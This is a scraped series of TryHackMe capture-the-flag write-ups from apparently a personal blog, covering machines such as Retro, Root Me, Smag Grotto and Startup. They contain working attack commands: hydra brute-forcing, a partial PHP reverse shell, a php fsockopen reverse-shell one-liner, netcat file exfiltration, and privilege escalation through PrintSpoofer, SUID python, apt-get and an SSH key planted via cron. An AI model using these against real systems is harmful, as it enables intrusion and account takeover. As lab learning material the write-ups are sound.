SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled I googled SeImpersonatePrivilege and I soon got to the simple command: PrintSpoofer.exe -i -c cmd, taken form PrintSpoofer.\nNow, we put the file using SMB. Where is the file now, in the machine? We go to C:/Inetpub/wwwroot/.\nc:\\inetpub\\wwwroot\\nt4wrksv\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is AC3C-5CB5 Directory of c:\\inetpub\\wwwroot\\nt4wrksv 05/26/2021 11:32 PM \u0026lt;DIR\u0026gt; . 05/26/2021 11:32 PM \u0026lt;DIR\u0026gt; .. 07/25/2020 08:15 AM 98 passwords.txt 05/26/2021 11:28 PM 27,136 PrintSpoofer.exe 05/26/2021 11:11 PM 53,168 rev.asp 05/26/2021 11:10 PM 3,416 rev.aspx 05/26/2021 10:54 PM 51 test.txt 5 File(s) 83,869 bytes 2 Dir(s) 21,113,995,264 bytes free Voila!\nc:\\inetpub\\wwwroot\\nt4wrksv\u0026gt;PrintSpoofer.exe -i -c cmd PrintSpoofer.exe -i -c cmd [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system System Compromised :)\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/AG5H2Sg.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-relevant-writeup/","title":"TryHackMe: Relevant Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration Let\u0026rsquo;s start with the nmap scan and run gobuster in parallel, since the questions hint on it.\nLooking at the website, it looks like a windows server.\n1.1 Port Scanning kali㉿kali)-[~] └─$ nmap -sC -sV -A 10.10.96.15 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 21:46 EDT Nmap scan report for 10.10.96.15 Host is up (0.26s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: RETROWEB | NetBIOS_Domain_Name: RETROWEB | NetBIOS_Computer_Name: RETROWEB | DNS_Domain_Name: RetroWeb | DNS_Computer_Name: RetroWeb | Product_Version: 10.0.14393 |_ System_Time: 2021-05-08T01:47:19+00:00 | ssl-cert: Subject: commonName=RetroWeb | Not valid before: 2021-05-07T01:35:04 |_Not valid after: 2021-11-06T01:35:04 |_ssl-date: 2021-05-08T01:47:23+00:00; +2s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1s, deviation: 0s, median: 1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.64 seconds Gobuster returned empty on the dirb common list. One other thing I want to try out is check for subdomains.\n1.2 Sub-Domains Using the command,\n┌──(kali㉿kali)-[/tmp] └─$ sudo wfuzz -Z -c -f sub-fighter -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u 10.10.96.15 -H \u0026quot;Host: FUZZ.10.10.96.16\u0026quot; --hc 200,400 we found out \u0026hellip; nothing. So, anyways, I looked at the hint, and they said \u0026hellip; run it on dirbuster medium list.\n1.3 Web Enumeration So I found out one directory named retro. Should have tried it the first thing lmao. Anyways, since they mention \u0026ldquo;the\u0026rdquo; directory, I\u0026rsquo;ll stop the scan and we\u0026rsquo;ll see what it holds for us.\nkali㉿kali)-[~] └─$ gobuster dir -u 10.10.96.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.96.15 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/05/07 22:09:35 Starting gobuster in directory enumeration mode =============================================================== /retro (Status: 301) [Size: 148] [--\u0026gt; http://10.10.96.15/retro/] Progress: 13495 / 220561 (6.12%) ^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/05/07 22:16:22 Finished =============================================================== Okay. Looking around, we have a login page, which looks like its a cms website. Plus, we see that even the \u0026ldquo;Hello World\u0026rdquo; post in the start (at the bottom) is made by Wade. This means we can try bruteforcing wp-login using hydra. One another path could be uploading a reverse shell, since the first post has a link where we can upload stuff. However, it just redirects to an external website. We can come back to it if hydra does not work out.\nOkay. Let\u0026rsquo;s fire up burp, and using the intercept option, we have\nPOST /retro/wp-login.php HTTP/1.1 ... log=Wade\u0026amp;pwd=brrr\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=%2Fretro%2Fwp-admin%2F\u0026amp;testcookie=1 As the POST request. Also, we are on the right track - look at the error message!\nNow we\u0026rsquo;ll do Hydra goes brrr.\n1.4 Bruteforcing From https://github.com/gnebbia/hydra_notes, I found the following,\n hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post \u0026lsquo;/wp- login.php:log=^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026rsquo;\nnow we check for success by using S=Location, since cms uses a Location header to redirect the user, we can think about S as a sort of grep applied to the HTTP response  Our command thus becomes\nhydra -l Wade -P /usr/share/wordlists/rockyou.txt 10.10.96.15 http-post-form \u0026quot;/retro/wp-login.php:log=^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=%2Fretro%2Fwp-admin%2F\u0026amp;testcookie=1:S=Location\u0026quot; Okay so meanwhile, I had a look at the hint to see if I am on the right track. The hint mentions the presence of sensitive information. Is it just the username? or maybe, I can look at the posts while hydra attacks.\n1.5 Web Exploration Oh my god. LMAO.\nOkok so, I was looking around, went to archives, nothing interesting. But, I clicked on Wade and looked at some other things, \u0026ldquo;Entries RSS\u0026rdquo;, \u0026ldquo;Comments RSS\u0026rdquo; looked interesting. So, the Entries was too filled up so I looked at comments first.\nAnd damn there was something off about the way the sentence is framed. Have a look:\n\u0026ldquo;Leaving myself a note here just in case I forget how to spell it: {password}\u0026rdquo;\nNow, ofcourse, this could be about ready player one, whose protagonist is this guy - and the story matches too XD\nSo, I tried logging in - no harm right, Hydra already running. And then I see this:\nEy voila! Stopped Hydra.\n1.6 Rev-Shell Time (or maybe not) We have some exploits for cms, in the 404 pages. Go to Appearance -\u0026gt; Theme Editor -\u0026gt; 404.php. We\u0026rsquo;ll put a tasty reverse shell here and then go to an invalid page on the website - thus redirecting us to 404 and we are set.\nHave a netcat listener setup on 1337 or a port of your choice: nc -lvnp 1337\nGoto https://www.revshells.com/ and get the PHP PentestMonkey code with your ip and port. Now, let\u0026rsquo;s comment out the 404.php WP gave us, and put this code.\nGo to http://10.10.96.15/retro/index.php/yougongetpwned\n\u0026hellip;\n\u0026ldquo;WARNING: Failed to daemonise. This is quite common and not fatal. Successfully opened reverse shell to 10.8.150.214:1337 ERROR: Shell process terminated\u0026rdquo;\nOkay. Very interesting. I have never seen this shit before, so I looked it up: https://www.reddit.com/r/oscp/comments/elh0ai/htb_bashed_failed_to_daemonise/ mentions how this may be a firewall issue. One redditor suggests using the port 443, so let\u0026rsquo;s try that.\n\u0026hellip; same error.\nI tried a bunch more common ports, but this wont budge.\n2. Restarting - Getting a Foothold Note that we have another port 3389 having ms-wbt-server. Let\u0026rsquo;s try going in using Remmina. We already have credentials.\nVery nice. User flag in our hands now!\nDoing some exploration we have, Notice: the bookmark and the history. It refers to the link: https://nvd.nist.gov/vuln/detail/CVE-2019-1388\nDoing some quick Google and YouTube search, I found this YouTube video.\n3. Priviledge Escalation Interestingly, we have another thing hidden here - check the Recycle Bin! The executable required to run this exploit is already present :)\nClick on \u0026ldquo;Show Details\u0026rdquo;\nClick on certificate thing, open with browser\n\u0026ldquo;Page not displayed\u0026rdquo;, this is a valid error since we do not have internet connection.\nSave it using ctrl+s, or using the steps shown.\nIf you see the error message, you are on the right track!\nSave it using the name . in C:\\Windows\\System32\n🗿📈\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/Cd3WvVT.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-retro-writeup/","title":"TryHackMe: Retro Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration 1.1 Port Scanning ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -A 10.10.35.149 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 01:18 EDT Nmap scan report for 10.10.35.149 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA) | 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA) |_ 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: HackIT - Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.57 seconds While go buster and nmap runs, I wanted to see if the website is built on php or not. The following works!\nhttp://10.10.35.149/index.php\n1.2 Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.35.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q /uploads (Status: 301) [Size: 314] [--\u0026gt; http://10.10.35.149/uploads/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.35.149/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.35.149/js/] /panel (Status: 301) [Size: 312] [--\u0026gt; http://10.10.35.149/panel/] Panel looks interesting, so let’s try uploading a README.md file (of this repo).\nSuccess! Let’s check the uploads page.\n1.3 Revshell Time Time for a phpreverseshell. Go to pentestmonkey or revshells.com and get the php one.\n\u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \u0026quot;1.0\u0026quot;; $ip = '10.8.150.214'; $port = 1337; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; sh -i'; $daemon = 0; $debug = 0; ... Okay, time for uploading! \u0026hellip; and we get\nClearly the extension is working against us, since .md passed.\nSo let\u0026rsquo;s see what other extensions are allowed. Source\n .phtml .php3 .php4 .php5 .phps  Okay. One by one.\n2. Foothold Ha! .phtml works! Lesgooo\n┌──(kali㉿kali)-[/tmp] └─$ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.35.149] 33678 Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 05:39:36 up 30 min, 0 users, load average: 0.00, 0.01, 0.18 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can't access tty; job control turned off $ whoami www-data $ pwd / $ ls bin boot cdrom dev ... 3. PrivEsc www-data@rootme:/home/rootme$ find / -type f -perm -u=s 2\u0026gt;/dev/null find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/traceroute6.iputils /usr/bin/newuidmap /usr/bin/newgidmap /usr/bin/chsh /usr/bin/python /usr/bin/at /usr/bin/chfn /usr/bin/gpasswd /usr/bin/sudo /usr/bin/newgrp /usr/bin/passwd /usr/bin/pkexec /snap/core/8268/bin/mount ... /snap/core/9665/usr/sbin/pppd /bin/mount /bin/su /bin/fusermount /bin/ping /bin/umount python thing looks interesting. gtfobins ftw!\nwww-data@rootme:/$ /usr/bin/python -c 'import os; os.execl(\u0026quot;/bin/sh\u0026quot;, \u0026quot;sh\u0026quot;, \u0026quot;-p\u0026quot;)' \u0026lt;hon -c 'import os; os.execl(\u0026quot;/bin/sh\u0026quot;, \u0026quot;sh\u0026quot;, \u0026quot;-p\u0026quot;)' whoami root bash -i bash: cannot set terminal process group (891): Inappropriate ioctl for device bash: no job control in this shell bash-4.4$ We are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/1xtAlAB.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-root-me-writeup/","title":"TryHackMe: Root Me Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA) | 256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA) |_ 256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Smag Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Nothing too special.\n1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -w /usr/share/wordlists/dirbuste-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -219 /index.php (Status: 200) [Size: 402] /mail (Status: 301) [Size: 311] [10.10.62.219/mail/] /mail/ looks interesting. We explore that below.\n1.3. Web Exploration We add the smag.thm line in /etc/hosts file, looking at their emails.\n┌──(kali㉿kali)-[~] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali 10.10.62.219 smag.thm # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 1.4. Wireshark The website has a file, which we can download just by clicking on it. Exploring it further.\nIn one of the packets, we found:\nPOST /login.php HTTP/1.1 Host: development.smag.thm User-Agent: curl/7.47.0 Accept: */* Content-Length: 39 Content-Type: application/x-www-form-urlencoded username={hidden}\u0026amp;password={wow_very_nice}HTTP/1.1 200 OK Date: Wed, 03 Jun 2020 18:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Content-Length: 0 Content-Type: text/html; charset=UTF-8 Add the development.smag.thm along with smag.thm domain in the /etc/hosts file. It thus looks like the following.\n┌──(kali㉿kali)-[/tmp] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali 10.10.62.219 smag.thm development.smag.thm # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 2. Foothold Logging in using the credentials from wireshark, we get a place to enter commands. I tried a bunch of commands, and this one stuck: php -r '$sock=fsockopen(\u0026quot;MY_KALI_IP\u0026quot;,4444);exec(\u0026quot;sh \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;);'\nWe get a shell!\n┌──(kali㉿kali)-[~] └─$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.17.8.184] from (UNKNOWN) [10.10.62.219] 33886 bash -i bash: cannot set terminal process group (707): Inappropriate ioctl for device bash: no job control in this shell www-data@smag:/var/www/development.smag.thm$ 3. PrivEsc Looking around, I found something intersting in /etc/crontab in the last line.\nwww-data@smag:/$ cat /etc/crontab cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup \u0026gt; /home/jake/.ssh/authorized_keys # We see the file /opt/.backups/jake_id_rsa.pub.backup is put into jake\u0026rsquo;s authorized keys. This means that if I can get my own, kali SSH public key in here, I would be able to login without a password.\nFirst, we need to make sure we have writing permissions.\nwww-data@smag:/$ ls -la /opt/.backups/jake_id_rsa.pub.backup ls -la /opt/.backups/jake_id_rsa.pub.backup -rw-rw-rw- 1 root root 563 Jun 5 2020 /opt/.backups/jake_id_rsa.pub.backup Great! Now I copy pasted my own id_rsa.pub key here.\nwww-data@smag:/$ echo \u0026quot;ssh-rsa {wow_nice_looking_key_uh} kali@kali\u0026quot; \u0026gt; /opt/.backups/jake_id_rsa.pub.backup And \u0026hellip;\n┌──(kali㉿kali)-[/tmp] └─$ ssh jake@10.10.62.219 The authenticity of host '10.10.62.219 (10.10.62.219)' can't be established. ECDSA key fingerprint is SHA256:MMv7NKmeLS/aEUSOLy0NbyGrLCEKErHJTp1cIvsxnpA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.62.219' (ECDSA) to the list of known hosts. Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Fri Jun 5 10:15:15 2020 jake@smag:~$ Success!\nNow for PrivEsc to root. Exploring a bit, I found:\njake@smag:~$ sudo -l Matching Defaults entries for jake on smag: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jake may run the following commands on smag: (ALL : ALL) NOPASSWD: /usr/bin/apt-get Using GTFOBins - apt-get sudo exploit\njake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh # whoami root # System compromised!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/C5DIAQd.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-smag-grotto-writeup/","title":"TryHackMe: Smag Grotto Writeup"},{"content":"Play\n1. Enumeration \u0026amp; Scanning 1.1 Port Scanning ┌──(kali㉿kali)-[/tmp] └─$ nmap -sC -sV -A 10.10.109.61 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 06:31 EDT Nmap scan report for 10.10.109.61 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp [NSE: writeable] | -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg |_-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.8.150.214 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA) | 256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA) |_ 256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Maintenance Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 50.09 seconds Anonymous login allowed \u0026hellip; why?\n1.2 FTP ┌──(kali㉿kali)-[/tmp] └─$ ftp 10.10.109.61 Connected to 10.10.109.61. 220 (vsFTPd 3.0.3) Name (10.10.109.61:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg -rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt 226 Directory send OK. ftp\u0026gt; get notice.txt ... ftp\u0026gt; get important.jpg ... ftp\u0026gt; cd ftp ... ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 . drwxr-xr-x 3 65534 65534 4096 Nov 12 2020 .. 226 Directory send OK. The ftp directory was empty. Let\u0026rsquo;s look at the other two files.\n┌──(kali㉿kali)-[/tmp] └─$ cat notice.txt Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus. One interesting thing to note is that the ftp directory is also writable.\n1.3 Web Enumeration \u0026amp; Exploration ┌──(kali㉿kali)-[~] └─$ gobuster dir -a R -u 10.10.109.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q /files (Status: 301) [Size: 312] [--\u0026gt; http://10.10.109.61/files/] Going to the web page, we see that all of these files are hosted, which were present in ftp port. This includes the image and the notice. Recall that ftp is also writeable. Its very clear now that we have to upload a reverse shell.\n1.4 Reverse Shell Now, the question is, of what? php? Well going to http://10.10.109.61/index.php leads me to a \u0026ldquo;Not Found\u0026rdquo; page. Uh \u0026hellip; perl or something?\nLet\u0026rsquo;s try php rev shell anyways. Use revshells and get one for yourself. put the file in /ftp folder. Start netcat on your specified port and ip.\n2. Foothold ┌──(kali㉿kali)-[~] └─$ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52074 Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 10:53:18 up 24 min, 0 users, load average: 0.00, 0.00, 0.06 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1233): Inappropriate ioctl for device bash: no job control in this shell www-data@startup:/$ And we are in!\nI tried cd-ing into the user, but to no avail. The ssh keys are also in palce. What to do? Hint says to look for something sus.\n2.1 Exploration We find a folder named incidents. It has a single pcapng file, suspicious.pcapng. I checked if the machine has netcat, and it does. So, let\u0026rsquo;s transfer the file and go in detail.\nOn attacked machine:\nwww-data@startup:/incidents$ nc 10.8.150.214 1337 \u0026lt; suspicious.pcapng On your machine:\n┌──(kali㉿kali)-[/tmp] └─$ nc -lvnp 1337 \u0026gt; sus.pcapng listening on [any] 1337 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52080 Looking around in the file, we have the passowrd hidden somewhere. Try finding it XD\n2.2 SSH ┌──(kali㉿kali)-[~] └─$ ssh lennie@10.10.109.61 ... $ bash -i lennie@startup:~$ And we are in (stably) :D\n3. PrivEsc I tried lennie@startup:/$ file / -type f -perm -u=s 2\u0026gt;/dev/null, which have empty results.\nThe sudo -l command does not work either.\nlennie@startup:/$ sudo -l sudo: unable to resolve host startup [sudo] password for lennie: Sorry, user lennie may not run sudo on startup. lennie@startup:/$ I checked the crontab, also not very interesting\nlennie@startup:~/scripts$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # lennie@startup:~/scripts$ Looking at the /scripts/ folder, we have some scripts lying around. I tried running the planner, and it printed out \u0026ldquo;done\u0026rdquo;.\nlennie@startup:~/scripts$ cat planner.sh #!/bin/bash echo $LIST \u0026gt; /home/lennie/scripts/startup_list.txt /etc/print.sh The startup_list is empty. Moreover running the script again shows planner.sh: line 2: /home/lennie/scripts/startup_list.txt: Permission denied\nThis means we have two options. Make some use of $LIST or explore /etc/print.sh. Since we don\u0026rsquo;t have permissions,\nlennie@startup:~/scripts$ ls -la total 16 drwxr-xr-x 2 root root 4096 Nov 12 2020 . drwx------ 5 lennie lennie 4096 May 18 11:33 .. -rwxr-xr-x 1 root root 77 Nov 12 2020 planner.sh -rw-r--r-- 1 root root 1 May 18 11:34 startup_list.txt let\u0026rsquo;s first look at /etc/print.sh.\nlennie@startup:~/scripts$ cat /etc/print.sh #!/bin/bash echo \u0026quot;Done!\u0026quot; We have permissions to edit this file,\nlennie@startup:~/scripts$ ls -la /etc/print.sh -rwx------ 1 lennie lennie 25 May 18 11:33 /etc/print.sh This means that we can put a reverse shell in here \u0026hellip; and hope for the best.\n┌──(kali㉿kali)-[/tmp] └─$ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52098 bash: cannot set terminal process group (2291): Inappropriate ioctl for device bash: no job control in this shell root@startup:~# And \u0026hellip; we have root!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/xPZaCyo.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-startup-writeup/","title":"TryHackMe: Startup Writeup"},{"content":"Play\n1. Enumeration and Scanning As usual, we start off with nmap and gobuster scans.\n❯ nmap -sC -sV -A 10.10.82.31\n❯ gobuster dir -u 10.10.82.31 -w \u0026quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\u0026quot; -x \u0026quot;html,php,txt\u0026quot;\nWhile they run, let\u0026rsquo;s check out the webpage itself. Looks like the default page.\nWe see two things: that bug and the team.thm thing. The bug link is nothing special. Let\u0026rsquo;s add team.thm to our host list.\n❯ sudo vim /etc/hosts ❯ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali 10.10.82.31 team.thm # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters Ah. we see a proper page up here.\n1.1 Port Scanning ❯ nmap -sC -sV -A 10.10.82.31 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 23:36 EST Nmap scan report for 10.10.82.31 Host is up (0.35s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA) | 256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA) |_ 256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te... Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.96 seconds 1.2 Web Enumeration ❯ gobuster dir -u team.thm -w \u0026quot;/usr/share/dirbustrectory-list-2.3-medium.txt\u0026quot; -x \u0026quot;html,php,txt\u0026quot; ================================================= Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer ================================================= [+] Url: http://team.thm [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlistt-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: html,php,txt [+] Timeout: 10s ================================================= 2021/03/09 23:44:28 Starting gobuster ================================================= /index.html (Status: 200) /images (Status: 301) /scripts (Status: 301) /assets (Status: 301) /robots.txt (Status: 200) scripts I can\u0026rsquo;t access, so i\u0026rsquo;ll leave it be. We can run another gobuster on team.thm/scripts, but that is for later. 